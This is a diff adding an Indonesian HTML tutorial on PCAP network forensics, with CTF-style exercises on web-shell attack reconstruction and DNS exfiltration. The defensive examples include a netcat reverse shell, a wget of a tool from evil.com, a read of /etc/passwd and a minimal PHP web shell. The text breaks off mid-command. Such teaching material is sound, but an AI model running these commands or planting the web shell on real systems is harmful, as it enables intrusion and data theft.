@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;color:#1a1a1a;padding:1rem;background:#fff;max-width:720px;margin:0 auto}
+h2{font-size:17px;font-weight:500;margin-bottom:6px}
+h3{font-size:14px;font-weight:500;margin-bottom:6px}
+p{font-size:13px;line-height:1.75;color:#555}
+.nav{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:1.25rem}
+.nav-btn{padding:6px 11px;border-radius:999px;border:0.5px solid #ccc;background:#fff;color:#555;font-size:11px;cursor:pointer;transition:all .15s}
+.nav-btn.active{background:#534AB7;color:#fff;border-color:#534AB7}
+.sec{display:none}.sec.active{display:block}
+.card{background:#fff;border:0.5px solid #ddd;border-radius:12px;padding:1rem 1.25rem;margin-bottom:.75rem}
+.soal-card{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:12px;padding:1rem 1.25rem;margin-bottom:1.25rem}
+.step-nav{display:flex;align-items:center;gap:10px;margin-bottom:1rem}
+.step-dots{display:flex;gap:5px;flex:1;flex-wrap:wrap}
+.dot{width:9px;height:9px;border-radius:50%;background:#ccc;border:none;padding:0;cursor:pointer}
+.btn-nav{padding:6px 16px;border-radius:8px;border:0.5px solid #ccc;background:#fff;color:#1a1a1a;font-size:13px;cursor:pointer}
+.btn-nav:hover{background:#f5f5f5}
+.btn-next{background:#534AB7;color:#fff;border-color:#534AB7}
+.btn-next:hover{background:#3C3489}
+.step-label{font-size:12px;color:#999}
+.step-panel{display:none}.step-panel.active{display:block}
+.eq{font-family:monospace;background:#f5f5f5;border:0.5px solid #ddd;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block}
+.eq-hi{font-family:monospace;background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#26215C}
+.eq-ok{font-family:monospace;background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#173404}
+.eq-danger{font-family:monospace;background:#FCEBEB;border:0.5px solid #F09595;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#501313}
+.eq-warn{font-family:monospace;background:#FAEEDA;border:0.5px solid #FAC775;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#412402}
+.ok{background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#27500A;margin:.4rem 0}
+.warn{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#633806;margin:.4rem 0}
+.danger{background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#791F1F;margin:.4rem 0}
+.note{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#26215C;margin:.4rem 0}
+.step-title{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:8px}
+.badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:500;margin-bottom:8px;background:#EEEDFE;color:#3C3489}
+.tbl{width:100%;border-collapse:collapse;font-size:12px;margin:.5rem 0}
+.tbl th{font-weight:500;text-align:left;padding:6px 10px;background:#f5f5f5;border:0.5px solid #ddd;color:#555}
+.tbl td{padding:6px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px}
+.hi-row td{background:#FCEBEB;color:#791F1F}
+.ok-row td{background:#EAF3DE;color:#27500A}
+.warn-row td{background:#FAEEDA;color:#633806}
+.purple-row td{background:#EEEDFE;color:#26215C}
+.big-ans{font-size:15px;font-weight:500;font-family:monospace;color:#534AB7}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:480px){.grid2{grid-template-columns:1fr}}
+.code-block{background:#1a1a2e;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:12px;color:#a8ff78;line-height:1.9;margin:.4rem 0;word-break:break-all}
+.cm{color:#555}.ck{color:#64b5f6}.cs{color:#ffd700}.cn{color:#f48fb1}
+.hi{background:#3d1a1a;color:#ff6b6b;border-radius:2px;padding:0 2px}
+.ok-hi{background:#1a3d1a;color:#a8ff78;border-radius:2px;padding:0 2px}
+.yl{color:#ffd700}.wh{color:#fff}.pl{color:#AFA9EC}
+.pkt{padding:4px 8px;border-radius:4px;font-family:monospace;font-size:11px;margin:2px 0;display:flex;justify-content:space-between;align-items:center;gap:6px}
+.pkt-http{background:#E6F1FB;color:#0C447C;border:0.5px solid #85B7EB}
+.pkt-dns{background:#EAF3DE;color:#27500A;border:0.5px solid #97C459}
+.pkt-sus{background:#FCEBEB;color:#791F1F;border:0.5px solid #F09595;border-width:2px}
+.pkt-ok{background:#EEEDFE;color:#3C3489;border:0.5px solid #AFA9EC}
+.pkt-warn{background:#FAEEDA;color:#633806;border:0.5px solid #FAC775}
+.pkt-plain{background:#f5f5f5;color:#1a1a1a;border:0.5px solid #ddd}
+.addr{font-size:10px;color:#888}
+.step-box{padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #534AB7;border-radius:0 6px 6px 0;font-size:12px;margin:.3rem 0;line-height:1.8}
+.filter-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-family:monospace;font-size:11px;background:#1a1a2e;color:#ffd700;margin:2px}
+</style>
+</head>
+<body>
+
+<div style="margin-bottom:1rem">
+  <div class="badge">Forensic — Network Forensic</div>
+  <h2>Analisis PCAP / PCAPNG</h2>
+  <p style="margin-top:4px">Network forensic menganalisis traffic jaringan yang terekam dalam file PCAP/PCAPNG untuk menemukan aktivitas mencurigakan, rekonstruksi data, dan identifikasi serangan. Tools utama: <strong>Wireshark</strong>, <strong>tshark</strong>, dan <strong>Scapy</strong>.</p>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showSec('konsep')">Konsep & Tools</button>
+  <button class="nav-btn" onclick="showSec('http')">Soal 1: HTTP Recon</button>
+  <button class="nav-btn" onclick="showSec('dns')">Soal 2: DNS Exfil</button>
+  <button class="nav-btn" onclick="showSec('creds')">Soal 3: Credentials</button>
+  <button class="nav-btn" onclick="showSec('c2')">Soal 4: C2 Detection</button>
+  <button class="nav-btn" onclick="showSec('tshark')">tshark Cheatsheet</button>
+</div>
+
+<!-- ============================================================ -->
+<!-- KONSEP -->
+<!-- ============================================================ -->
+<div id="sec-konsep" class="sec active">
+  <div class="card">
+    <div class="step-title">Fondasi — Format PCAP dan struktur paket</div>
+    <h3>Apa itu PCAP dan bagaimana dibaca</h3>
+    <p style="margin-bottom:.75rem">PCAP (Packet Capture) adalah format file yang menyimpan raw network packets. Setiap paket berisi header (waktu, panjang) dan data paket lengkap dari layer 2 sampai layer 7.</p>
+    <div class="code-block">
+<span class="cm">## Struktur paket (OSI Layer):</span>
+Layer 2: Ethernet  [src MAC | dst MAC | type]
+Layer 3: IP        [src IP  | dst IP  | protocol]
+Layer 4: TCP/UDP   [src port| dst port| flags | seq/ack]
+Layer 7: HTTP/DNS/FTP/... [application data]
+
+<span class="cm">## Contoh paket HTTP GET:</span>
+Frame 42: 74 bytes on wire
+Ethernet: src=aa:bb:cc:dd:ee:ff, dst=11:22:33:44:55:66
+IPv4: src=192.168.1.100, dst=93.184.216.34
+TCP: src_port=54321, dst_port=80, flags=PSH,ACK
+HTTP: GET /secret.txt HTTP/1.1\r\n
+      Host: example.com\r\n
+      User-Agent: curl/7.68.0\r\n
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Workflow analisis PCAP</div>
+    <h3>Lima langkah sistematis untuk setiap soal PCAP</h3>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:12px;margin:.5rem 0">
+      <div class="step-box"><strong>1. Overview:</strong> berapa paket total? IP mana yang paling aktif? protokol apa yang dominan?</div>
+      <div class="step-box"><strong>2. Filter berdasarkan protokol:</strong> http, dns, ftp, smtp, tls — fokus satu per satu</div>
+      <div class="step-box"><strong>3. Follow stream:</strong> rekonstruksi percakapan lengkap dari TCP/UDP stream</div>
+      <div class="step-box"><strong>4. Extract artifacts:</strong> export file, credentials, query DNS, HTTP payload</div>
+      <div class="step-box"><strong>5. Identify anomali:</strong> port tidak lazim, volume besar, pola yang aneh, encoded data</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Wireshark display filter paling penting</div>
+    <div style="display:flex;flex-wrap:wrap;gap:4px;margin:.5rem 0">
+      <span class="filter-badge">http</span>
+      <span class="filter-badge">dns</span>
+      <span class="filter-badge">ftp</span>
+      <span class="filter-badge">smtp</span>
+      <span class="filter-badge">tcp.port==80</span>
+      <span class="filter-badge">ip.addr==1.2.3.4</span>
+      <span class="filter-badge">http.request.method=="POST"</span>
+      <span class="filter-badge">dns.qry.name contains "evil"</span>
+      <span class="filter-badge">frame contains "password"</span>
+      <span class="filter-badge">tcp.flags.syn==1 && tcp.flags.ack==0</span>
+      <span class="filter-badge">!(arp || icmp || dns)</span>
+      <span class="filter-badge">http.response.code==200</span>
+      <span class="filter-badge">tls.handshake.type==1</span>
+      <span class="filter-badge">tcp.stream eq 5</span>
+    </div>
+    <div class="note" style="margin-top:.5rem">Di Wireshark: Statistics → Conversations untuk lihat top talkers. Statistics → Protocol Hierarchy untuk breakdown protokol. File → Export Objects → HTTP untuk extract file.</div>
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- SOAL 1: HTTP RECON -->
+<!-- ============================================================ -->
+<div id="sec-http" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 1 — HTTP Traffic Analysis</div>
+  <h2 style="color:#26215C">Rekonstruksi aktivitas attacker dari HTTP traffic!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">Diberikan PCAP dari server yang dikompromis. Analisis HTTP traffic untuk temukan: apa yang attacker lakukan, file apa yang diakses, dan apakah ada data yang dicuri!</p>
+  <div style="background:#fff;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:11px;border:0.5px solid #AFA9EC;margin-bottom:.75rem;line-height:1.9">
+    <div style="color:#888;margin-bottom:4px">Packets yang relevan (disederhanakan dari PCAP):</div>
+    <div class="pkt pkt-ok" style="margin:2px 0"><span>No.1  192.168.1.50 → 10.0.0.5  GET /index.php HTTP/1.1</span><span class="addr">t=0.001s</span></div>
+    <div class="pkt pkt-ok" style="margin:2px 0"><span>No.2  10.0.0.5 → 192.168.1.50  HTTP/1.1 200 OK (text/html)</span><span class="addr">t=0.050s</span></div>
+    <div class="pkt pkt-warn" style="margin:2px 0"><span>No.3  192.168.1.50 → 10.0.0.5  GET /admin/config.php HTTP/1.1</span><span class="addr">t=1.200s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.4  192.168.1.50 → 10.0.0.5  GET /admin/config.php?cmd=id HTTP/1.1</span><span class="addr">t=2.100s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.5  10.0.0.5 → 192.168.1.50  HTTP 200: uid=33(www-data) gid=33(www-data)</span><span class="addr">t=2.150s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.6  192.168.1.50 → 10.0.0.5  GET /admin/config.php?cmd=cat+/etc/passwd HTTP/1.1</span><span class="addr">t=3.000s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.7  10.0.0.5 → 192.168.1.50  HTTP 200: root:x:0:0:root:/root:/bin/bash...</span><span class="addr">t=3.050s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.8  192.168.1.50 → 10.0.0.5  POST /upload.php (multipart, filename="shell.php")</span><span class="addr">t=5.000s</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>No.9  192.168.1.50 → 10.0.0.5  GET /uploads/shell.php?cmd=wget+http://evil.com/nc</span><span class="addr">t=6.000s</span></div>
+  </div>
+  <p style="color:#3C3489;font-size:12px">Pertanyaan: (1) Jenis serangan apa? (2) Rekonstruksi timeline serangan, (3) Filter Wireshark untuk temukan semua cmd injection!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="h1-prev" onclick="prevStep('h1')" disabled>Prev</button>
+  <div class="step-dots" id="h1-dots"></div>
+  <span class="step-label" id="h1-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="h1-next" onclick="nextStep('h1')">Next</button>
+</div>
+
+<!-- H1 STEP 0 -->
+<div class="step-panel active" id="h1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Identifikasi jenis serangan</div>
+    <h3>Web shell via command injection + file upload</h3>
+    <p style="margin-bottom:.75rem">Dari pola packet, identifikasi tiga fase serangan:</p>
+    <table class="tbl">
+      <tr><th>Fase</th><th>Packet</th><th>Aktivitas</th><th>Indikator</th></tr>
+      <tr class="ok-row"><td>Recon</td><td>1-3</td><td>Browse normal, coba /admin/</td><td>GET requests ke berbagai path</td></tr>
+      <tr class="warn-row"><td>Exploitation</td><td>4-7</td><td>Command injection via ?cmd=</td><td>Parameter ?cmd= dengan OS commands</td></tr>
+      <tr class="hi-row"><td>Persistence</td><td>8-9</td><td>Upload web shell, eksekusi</td><td>POST multipart + shell.php</td></tr>
+    </table>
+    <div class="danger">Serangan: <strong>Remote Code Execution (RCE) via Command Injection</strong> + <strong>Web Shell Upload</strong>. Server sudah full compromise!</div>
+    <p style="margin-top:.5rem;font-size:12px">Indikator utama yang mencurigakan:</p>
+    <div class="eq-danger">?cmd=id         ← OS command injection
+?cmd=cat+/etc/passwd ← baca file sensitif
+POST shell.php  ← upload backdoor
+?cmd=wget+http://evil.com/nc ← download tool</div>
+  </div>
+</div>
+
+<!-- H1 STEP 1 -->
+<div class="step-panel" id="h1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Rekonstruksi timeline serangan</div>
+    <h3>Susun urutan kejadian dari timestamp packet</h3>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:12px;margin:.5rem 0">
+      <div class="step-box"><span style="color:#534AB7;font-weight:500">t=0.001s</span> — Attacker (192.168.1.50) melakukan GET /index.php (reconnaissance awal)</div>
+      <div class="step-box"><span style="color:#534AB7;font-weight:500">t=1.200s</span> — Akses /admin/config.php — probing endpoint admin</div>
+      <div class="step-box"><span style="color:#791F1F;font-weight:500">t=2.100s</span> — EXPLOIT: ?cmd=id → server return "uid=33(www-data)" — RCE berhasil!</div>
+      <div class="step-box"><span style="color:#791F1F;font-weight:500">t=3.000s</span> — Data exfil: cat /etc/passwd — membaca daftar user sistem</div>
+      <div class="step-box"><span style="color:#791F1F;font-weight:500">t=5.000s</span> — Persistence: upload shell.php via POST /upload.php</div>
+      <div class="step-box"><span style="color:#791F1F;font-weight:500">t=6.000s</span> — Lateral movement prep: wget netcat dari evil.com</div>
+    </div>
+    <div class="danger">Total waktu dari recon ke persistence: hanya 6 detik! Ini kemungkinan serangan otomatis atau attacker yang sangat familiar dengan vulnerability ini.</div>
+  </div>
+</div>
+
+<!-- H1 STEP 2 -->
+<div class="step-panel" id="h1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Filter Wireshark untuk analisis</div>
+    <h3>Display filter dan tshark command yang relevan</h3>
+    <div class="code-block">
+<span class="cm">## Wireshark Display Filters:</span>
+
+<span class="cm"># Lihat semua HTTP dari attacker:</span>
+ip.src == 192.168.1.50 && http
+
+<span class="cm"># Cari semua command injection (URL mengandung "cmd="):</span>
+http.request.uri contains "cmd="
+
+<span class="cm"># Cari POST requests (upload):</span>
+http.request.method == "POST"
+
+<span class="cm"># Lihat semua response dari server:</span>
+ip.src == 10.0.0.5 && http.response
+
+<span class="cm"># Follow TCP stream untuk rekonstruksi full session:</span>
+<span class="cm"># Klik kanan paket → Follow → TCP Stream</span>
+
+<span class="cm">## tshark commands:</span>
+<span class="cm"># Extract semua HTTP request URLs:</span>
+tshark -r capture.pcap -Y "http.request" \
+  -T fields -e ip.src -e http.request.uri
+
+<span class="cm"># Extract semua HTTP response bodies:</span>
+tshark -r capture.pcap -Y "http.response" \
+  -T fields -e http.file_data
+
+<span class="cm"># Cari string mencurigakan di seluruh PCAP:</span>
+tshark -r capture.pcap -Y "frame contains \"cmd=\""
+    </div>
+  </div>
+</div>
+
+<!-- H1 STEP 3 -->
+<div class="step-panel" id="h1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Extract web shell dari PCAP</div>
+    <h3>Rekonstruksi file shell.php yang di-upload</h3>
+    <p style="margin-bottom:.75rem">Dari packet No.8, kita bisa extract konten web shell yang di-upload dengan cara follow TCP stream atau export HTTP object.</p>
+    <div class="code-block">
+<span class="cm">## Di Wireshark:</span>
+<span class="cm"># File → Export Objects → HTTP</span>
+<span class="cm"># Pilih "shell.php" → Save</span>
+
+<span class="cm">## Dengan tshark:</span>
+tshark -r capture.pcap --export-objects http,./extracted/
+
+<span class="cm">## Isi shell.php yang terekstrak (kemungkinan):</span>
+<span class="cs">&lt;?php</span>
+<span class="cs">if(isset($_GET['cmd'])) {</span>
+<span class="cs">    system($_GET['cmd']);</span>
+<span class="cs">}</span>
+<span class="cs">?&gt;</span>
+
+<span class="cm">## Ini adalah web shell sederhana — setiap akses ke:</span>
+<span class="cm">## /uploads/shell.php?cmd=APAPUN</span>
+<span class="cm">## akan dieksekusi sebagai OS command!</span>
+
+<span class="cm">## Cari IOC (Indicators of Compromise):</span>
+<span class="cm"># Attacker IP: 192.168.1.50</span>
+<span class="cm"># Malicious domain: evil.com</span>
+<span class="cm"># Webshell path: /uploads/shell.php</span>
+<span class="cm"># Vulnerable endpoint: /admin/config.php?cmd=</span>
+    </div>
+  </div>
+</div>
+
+<!-- H1 STEP 4 -->
+<div class="step-panel" id="h1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Decode URL-encoded commands</div>
+    <h3>URL encoding menyembunyikan payload — perlu di-decode</h3>
+    <p style="margin-bottom:.75rem">Attacker sering URL-encode command untuk bypass WAF atau logging sederhana:</p>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>URL Encoded (dari PCAP)</th><th>Decoded</th><th>Arti</th></tr>
+      <tr class="hi-row"><td>cmd=id</td><td>id</td><td>Cek user yang menjalankan server</td></tr>
+      <tr class="hi-row"><td>cmd=cat+/etc/passwd</td><td>cat /etc/passwd</td><td>Baca daftar user sistem</td></tr>
+      <tr class="hi-row"><td>cmd=ls+-la+/var/www</td><td>ls -la /var/www</td><td>List file web server</td></tr>
+      <tr class="hi-row"><td>cmd=wget+http%3A%2F%2Fevil.com%2Fnc</td><td>wget http://evil.com/nc</td><td>Download netcat backdoor</td></tr>
+      <tr class="hi-row"><td>cmd=nc+-e+/bin/sh+192.168.1.50+4444</td><td>nc -e /bin/sh 192.168.1.50 4444</td><td>Reverse shell ke attacker!</td></tr>
+    </table>
+    <div class="code-block">
+<span class="cm">## Python untuk decode URL dari PCAP:</span>
+<span class="ck">from</span> urllib.parse <span class="ck">import</span> unquote
+<span class="ck">import</span> re
+
+<span class="ck">with</span> open(<span class="cs">'http_requests.txt'</span>) <span class="ck">as</span> f:
+    <span class="ck">for</span> line <span class="ck">in</span> f:
+        cmds = re.findall(<span class="cs">r'cmd=([^&\s\r\n]+)'</span>, line)
+        <span class="ck">for</span> cmd <span class="ck">in</span> cmds:
+            print(<span class="cs">f"CMD: {unquote(cmd)}"</span>)
+    </div>
+  </div>
+</div>
+
+<!-- H1 STEP 5 -->
+<div class="step-panel" id="h1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Jawaban dan ringkasan</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">(1) RCE via Command Injection + Web Shell Upload</div>
+      <div class="big-ans" style="margin-top:4px">(3) Filter: http.request.uri contains "cmd="</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #534AB7">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Ringkasan HTTP Forensic</p>
+      <p style="font-size:12px">1. Filter: ip.src == attacker_ip && http</p>
+      <p style="font-size:12px">2. Cari anomali di URI: ?cmd=, ?exec=, shell, admin, upload</p>
+      <p style="font-size:12px">3. Follow TCP stream untuk rekonstruksi full session</p>
+      <p style="font-size:12px">4. Export Objects HTTP untuk extract file yang di-upload/download</p>
+      <p style="font-size:12px">5. URL-decode semua parameter mencurigakan</p>
+      <p style="font-size:12px;color:#A32D2D;margin-top:4px">IOC: attacker IP, C2 domain/IP, webshell path, malicious URIs</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end http -->
+
+<!-- ============================================================ -->
+<!-- SOAL 2: DNS EXFILTRATION -->
+<!-- ============================================================ -->
+<div id="sec-dns" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#534AB7;margin-bottom:6px">Soal 2 — DNS Exfiltration</div>
+  <h2 style="color:#26215C">Data dicuri melalui DNS query!</h2>
+  <p style="color:#3C3489;margin-top:6px;margin-bottom:.75rem">DNS exfiltration adalah teknik menyembunyikan data dalam DNS query/response. Karena DNS sering dibiarkan melewati firewall, ini cara populer untuk exfiltrate data tanpa terdeteksi. Analisis DNS traffic mencurigakan berikut!</p>
+  <div style="background:#fff;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:11px;border:0.5px solid #AFA9EC;margin-bottom:.75rem;line-height:1.9">
+    <div style="color:#888;margin-bottom:4px">DNS queries yang terekam (anomali):</div>
+    <div class="pkt pkt-ok" style="margin:2px 0"><span>Query: google.com → 8.8.8.8 (normal)</span></div>
+    <div class="pkt pkt-ok" style="margin:2px 0"><span>Query: github.com → 8.8.8.8 (normal)</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>aGVsbG8=</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>d29ybGQ=</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>dGhpcw==</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>aXNh</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>c2VjcmV0</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div class="pkt pkt-sus" style="margin:2px 0"><span>Query: <strong>bWVzc2FnZQ==</strong>.evil-c2.com → 203.0.113.1</span></div>
+    <div style="margin-top:4px;color:#888">Total: 847 DNS queries ke evil-c2.com dalam 10 menit</div>
+  </div>
+  <p style="color:#3C3489;font-size:12px">Pertanyaan: (1) Decode data yang dieksfiltasi, (2) Rekonstruksi pesan lengkap, (3) Filter untuk detect DNS exfil!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="d1-prev" onclick="prevStep('d1')" disabled>Prev</button>
+  <div class="step-dots" id="d1-dots"></div>
+  <span class="step-label" id="d1-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="d1-next" onclick="nextStep('d1')">Next</button>
+</div>
+
+<!-- D1 STEP 0 -->
+<div class="step-panel active" id="d1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Identifikasi DNS exfiltration</div>
+    <h3>Tanda-tanda DNS exfiltration dalam traffic</h3>
+    <table class="tbl">
+      <tr><th>Indikator</th><th>Normal</th><th>DNS Exfil</th></tr>
+      <tr class="hi-row"><td>Subdomain panjang</td><td>www, mail, ftp</td><td>aGVsbG8=, d29ybGQ= (base64!)</td></tr>
+      <tr class="hi-row"><td>Volume query</td><td>Puluhan per jam</td><td>847 query dalam 10 menit!</td></tr>
+      <tr class="hi-row"><td>Domain tujuan</td><td>Dikenal, ada di whitelist</td><td>evil-c2.com — tidak pernah ada sebelumnya</td></tr>
+      <tr class="hi-row"><td>Pola subdomain</td><td>Human-readable</td><td>Random char / base64 encoded</td></tr>
+      <tr class="hi-row"><td>NXDOMAIN rate</td><td>Rendah</td><td>Mungkin tinggi kalau exfil pakai domain tidak exist</td></tr>
+    </table>
+    <div class="danger">847 query ke satu domain dalam 10 menit = rata-rata 1.4 query/detik. Ini jauh di atas normal dan jelas indikasi automated exfiltration!</div>
+    <div class="note" style="margin-top:.4rem">Subdomain "aGVsbG8=", "d29ybGQ=" mengandung karakter '=', '/' yang hanya ada dalam Base64 encoding. Ini tanda langsung DNS exfiltration via Base64.</div>
+  </div>
+</div>
+
+<!-- D1 STEP 1 -->
+<div class="step-panel" id="d1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Decode Base64 dari subdomain</div>
+    <h3>Setiap subdomain = satu chunk data yang di-encode</h3>
+    <p style="margin-bottom:.75rem">Extrak subdomain dari query (bagian sebelum .evil-c2.com) lalu decode Base64:</p>
+    <table class="tbl" style="margin-bottom:.75rem">
+      <tr><th>Subdomain (Base64)</th><th>Decoded (ASCII)</th></tr>
+      <tr class="purple-row"><td>aGVsbG8=</td><td>hello</td></tr>
+      <tr class="purple-row"><td>d29ybGQ=</td><td>world</td></tr>
+      <tr class="purple-row"><td>dGhpcw==</td><td>this</td></tr>
+      <tr class="purple-row"><td>aXNh</td><td>isa</td></tr>
+      <tr class="purple-row"><td>c2VjcmV0</td><td>secret</td></tr>
+      <tr class="purple-row"><td>bWVzc2FnZQ==</td><td>message</td></tr>
+    </table>
+    <div class="code-block">
+<span class="cm">## Python untuk decode:</span>
+<span class="ck">import</span> base64
+
+subdomains = [<span class="cs">"aGVsbG8="</span>, <span class="cs">"d29ybGQ="</span>, <span class="cs">"dGhpcw=="</span>,
+              <span class="cs">"aXNh"</span>, <span class="cs">"c2VjcmV0"</span>, <span class="cs">"bWVzc2FnZQ=="</span>]
+
+<span class="ck">for</span> s <span class="ck">in</span> subdomains:
+    decoded = base64.b64decode(s + <span class="cs">"=="</span>).decode()  <span class="cm"># pad jika perlu</span>
+    print(<span class="cs">f"{s} → {decoded}"</span>)
+
+<span class="cm"># Output:</span>
+<span class="cm"># aGVsbG8= → hello</span>
+<span class="cm"># d29ybGQ= → world</span>
+<span class="cm"># dGhpcw== → this</span>
+<span class="cm"># aXNh → isa</span>
+<span class="cm"># c2VjcmV0 → secret</span>
+<span class="cm"># bWVzc2FnZQ== → message</span>
+    </div>
+  </div>
+</div>
+
+<!-- D1 STEP 2 -->
+<div class="step-panel" id="d1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Rekonstruksi pesan lengkap</div>
+    <h3>Gabungkan semua chunk secara berurutan</h3>
+    <p style="margin-bottom:.75rem">DNS queries terurut berdasarkan timestamp — gabungkan decoded chunk secara berurutan untuk mendapat pesan asli:</p>
+    <span class="eq-hi">Chunk 1: "hello"
+Chunk 2: " world"
+Chunk 3: " this"
+Chunk 4: " isa"
+Chunk 5: " secret"
+Chunk 6: " message"
+
+Pesan lengkap: "hello world this isa secret message"</span>
+    <div class="code-block">
+<span class="cm">## Otomatis extract dari PCAP dengan tshark + python:</span>
+<span class="cm"># Step 1: Extract semua DNS query ke evil-c2.com</span>
+tshark -r capture.pcap \
+  -Y 'dns.qry.name contains "evil-c2.com"' \
+  -T fields -e dns.qry.name \
+  | sort -t. -k1 > dns_queries.txt
+
+<span class="cm"># Step 2: Extract subdomain dan decode</span>
+<span class="ck">import</span> base64, re
+
+<span class="ck">with</span> open(<span class="cs">'dns_queries.txt'</span>) <span class="ck">as</span> f:
+    chunks = []
+    <span class="ck">for</span> line <span class="ck">in</span> f:
+        subdomain = line.split(<span class="cs">'.'</span>)[<span class="cn">0</span>].strip()
+        <span class="ck">try</span>:
+            pad = subdomain + <span class="cs">'='</span> * (-len(subdomain) % <span class="cn">4</span>)
+            decoded = base64.b64decode(pad).decode(<span class="cs">'utf-8'</span>, errors=<span class="cs">'ignore'</span>)
+            chunks.append(decoded)
+        <span class="ck">except</span>: <span class="ck">pass</span>
+
+print(<span class="cs">""</span>.join(chunks))  <span class="cm"># Pesan yang dieksfiltasi!</span>
+    </div>
+    <div class="ok">Pesan terkonstruksi: "hello world this isa secret message". Di skenario nyata, ini bisa berupa credentials, dokumen rahasia, atau kunci enkripsi!</div>
+  </div>
+</div>
+
+<!-- D1 STEP 3 -->
+<div class="step-panel" id="d1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Filter Wireshark untuk detect DNS exfil</div>
+    <h3>Display filter yang efektif untuk temukan anomali DNS</h3>
+    <div class="code-block">
+<span class="cm">## Filter untuk domain mencurigakan:</span>
+dns.qry.name contains "evil-c2.com"
+
+<span class="cm">## Filter domain dengan subdomain panjang (>50 char = mencurigakan):</span>
+dns && dns.qry.name matches "^.{50,}\."
+
+<span class="cm">## Filter query volume tinggi ke domain tertentu:</span>
+<span class="cm"># Statistics → DNS → sort by Query Name untuk lihat top domains</span>
+
+<span class="cm">## Filter subdomain yang mengandung base64 pattern (alphanum + = /)</span>
+dns.qry.name matches "^[A-Za-z0-9+/=]{20,}\."
+
+<span class="cm">## tshark: hitung unique domain:</span>
+tshark -r capture.pcap -Y dns -T fields -e dns.qry.name \
+  | sort | uniq -c | sort -rn | head -20
+
+<span class="cm">## tshark: hitung query per menit untuk detect burst:</span>
+tshark -r capture.pcap -Y dns -T fields -e frame.time_relative \
